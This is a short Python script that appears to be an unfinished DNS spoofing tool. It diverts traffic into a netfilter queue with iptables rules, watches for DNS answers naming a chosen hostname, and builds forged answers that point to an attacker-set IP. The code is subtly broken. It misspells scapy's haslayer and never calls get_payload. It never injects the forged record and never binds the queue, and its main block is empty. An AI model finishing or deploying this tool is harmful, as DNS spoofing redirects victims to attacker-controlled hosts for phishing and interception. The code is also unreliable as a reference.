import netfilterqueue
import scapy.all as scapy
import subprocess


from_hostname: str
to_ip: str
commands: list
VMenv: bool


def process_packet(packet):
    global from_hostname
    global to_ip

    scapy_packet = scapy.IP(packet.get_payload)

    if scapy_packet.hashlayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if from_hostname in qname:
            print("[+] Spoofing start")
            answer = scapy.DNSRR(rrname=qname, rdata=to_ip)


def env_set(VMenv):

    if VMenv == "VM":
        subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "1"])
        subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])
    elif VMenv == "OS":
        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    else:
        print("[!] Wrong enviroment settings")


if __name__ == "__main__":
    pass
